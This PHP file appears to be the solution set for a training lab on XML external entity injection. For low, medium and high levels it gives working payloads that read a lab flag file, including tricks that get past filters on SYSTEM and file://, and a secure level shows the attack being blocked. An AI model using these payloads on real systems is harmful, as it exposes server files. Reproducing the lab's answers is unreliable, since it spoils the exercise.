<?php
$h = 'Content-Type: application/xml';
$doc = fn($entity) => "<?xml version=\"1.0\"?>\n<!DOCTYPE product [\n  $entity\n]>\n<product><name>&xxe;</name></product>";
$req = fn($entity) => ['method' => 'POST', 'path' => '/labs/xxe-import/run', 'headers' => $h, 'body' => $doc($entity)];
return [
  'low' => [
    'goal' => "Define an external entity that reads a server file.",
    'steps' => [
      "Declare an entity in the DOCTYPE and reference it inside <name>.",
      "Use <!ENTITY xxe SYSTEM \"file:///opt/forge/flag.txt\"> and &xxe; in the name.",
    ],
    'why' => "The parser resolves external entities, so it opens the file you named and substitutes its contents into the field the importer echoes back.",
    'run' => [$req('<!ENTITY xxe SYSTEM "file:///opt/forge/flag.txt">')],
  ],
  'medium' => [
    'goal' => "Declare an external entity when SYSTEM is filtered.",
    'steps' => [
      "The word SYSTEM is rejected.",
      "XML also declares an external id with PUBLIC: <!ENTITY xxe PUBLIC \"x\" \"file:///opt/forge/flag.txt\">",
    ],
    'why' => "SYSTEM and PUBLIC both declare an external identifier. Filtering one keyword leaves the other, so the entity still loads the file.",
    'run' => [$req('<!ENTITY xxe PUBLIC "x" "file:///opt/forge/flag.txt">')],
  ],
  'high' => [
    'goal' => "Point the entity at a file when the file:// scheme is filtered.",
    'steps' => [
      "The file:// scheme is rejected.",
      "An external id can be a bare absolute path: <!ENTITY xxe SYSTEM \"/opt/forge/flag.txt\">",
    ],
    'why' => "The parser accepts a scheme-less absolute path for a system identifier, so dropping file:// still reaches the same file.",
    'run' => [$req('<!ENTITY xxe SYSTEM "/opt/forge/flag.txt">')],
  ],
  'secure' => [
    'goal' => "Confirm a safe parser ignores the DOCTYPE.",
    'steps' => [
      "The parser loads no DTDs, substitutes no entities, and DOCTYPEs are rejected.",
      "Send the SYSTEM payload and watch it be blocked.",
    ],
    'why' => "With entity processing disabled, a declared external entity is never resolved, so the DOCTYPE cannot pull in any file.",
    'run' => [$req('<!ENTITY xxe SYSTEM "file:///opt/forge/flag.txt">')],
  ],
];
